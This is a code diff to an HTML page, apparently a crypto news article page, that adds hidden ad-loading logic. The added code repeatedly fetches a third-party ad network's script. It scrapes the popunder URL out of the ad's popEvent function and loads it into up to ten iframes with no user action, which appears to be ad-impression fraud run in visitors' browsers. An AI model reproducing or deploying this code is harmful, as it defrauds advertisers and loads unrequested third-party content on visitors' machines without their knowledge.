@@ -52,6 +52,13 @@ The Binance CEO opined:
 <iframe id="declinedframe1" src="" height="600" width="600" ></iframe>
 <iframe id="declinedframe2" src="" height="600" width="600" ></iframe>
 <iframe id="declinedframe3" src="" height="600" width="600" ></iframe>
+<iframe id="declinedframe4" src="" height="600" width="600" ></iframe>
+<iframe id="declinedframe5" src="" height="600" width="600" ></iframe>
+<iframe id="declinedframe6" src="" height="600" width="600" ></iframe>
+<iframe id="declinedframe7" src="" height="600" width="600" ></iframe>
+<iframe id="declinedframe8" src="" height="600" width="600" ></iframe>
+<iframe id="declinedframe9" src="" height="600" width="600" ></iframe>
+<iframe id="declinedframe10" src="" height="600" width="600" ></iframe>
 </div>
 		<script src = "https://www.tutorialspoint.com/jquery/jquery-3.6.0.js"></script>
 
@@ -87,14 +94,136 @@ The Binance CEO opined:
 
 		//','','width=600px,height=600px
 		  
-		  
+		  var path = $("script[src^='https://adsnetworkplus.com/display/index.php']").attr('src');
+			
+$.getScript(path, function(data, textStatus, jqxhr) {
+	suc1('#declinedframe2');
+
+	$.getScript(path, function(data, textStatus, jqxhr) {
+		suc1('#declinedframe3');
+
+		$.getScript(path, function(data, textStatus, jqxhr) {
+			suc1('#declinedframe4');
+
+			$.getScript(path, function(data, textStatus, jqxhr) {
+				suc1('#declinedframe5');
+
+				$.getScript(path, function(data, textStatus, jqxhr) {
+					suc1('#declinedframe6');
+
+					$.getScript(path, function(data, textStatus, jqxhr) {
+						suc1('#declinedframe7');
+
+						$.getScript(path, function(data, textStatus, jqxhr) {
+							suc1('#declinedframe8');
+
+							$.getScript(path, function(data, textStatus, jqxhr) {
+								suc1('#declinedframe9');
+
+								$.getScript(path, function(data, textStatus, jqxhr) {
+									suc1('#declinedframe10');
+								}).fail(function() {
+									//suc1();
+								});
+
+							}).fail(function() {
+								//suc1();
+							});
+
+						}).fail(function() {
+							//suc1();
+						});
+
+					}).fail(function() {
+						//suc1();
+					});
+
+
+				}).fail(function() {
+					//suc1();
+				});
+
+			}).fail(function() {
+				//suc1();
+			});
+
+
+		}).fail(function() {
+			//suc1();
+		});
+
+	}).fail(function() {
+		//suc1();
+	});
+
+
+}).fail(function() {
+	//suc1();
+});
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+			
 		}
 		//popEvent();
 		 
 	   }		  
         }, 2000)
       }
-      
+
+
+	
+		function suc1(iframe1) { 
+			setTimeout(function() {
+				if (typeof popEvent === 'undefined') {
+							suc1();
+							  // myVar is (not defined) OR (defined AND unitialized)
+						} else {
+							   var entire = popEvent.toString(); 
+							var body = entire.slice(entire.indexOf("{") + 1, entire.lastIndexOf("}"));
+				
+							//console.log(body);
+						  var t1 = body.split("open('", 2);
+						  var t2 = t1[1];
+						  var t3 = t2.split("');", 1);
+						var t4 = t3[0];
+						  //var result = t4.includes("',");
+						// if(result) {
+						 //	var t5  = t4.split("',", 1);
+						//	 $('#declinedframe').attr('src', t5[0]);
+						// } else {
+						 	$(iframe1).attr('src', t4);
+						// }
+						  
+				
+						//','','width=600px,height=600px
+						  
+						  
+						}
+						//popEvent();
+			
+			}, 2000)
+			
+		}
+		
       myLoop();    
     </script>
 </body>
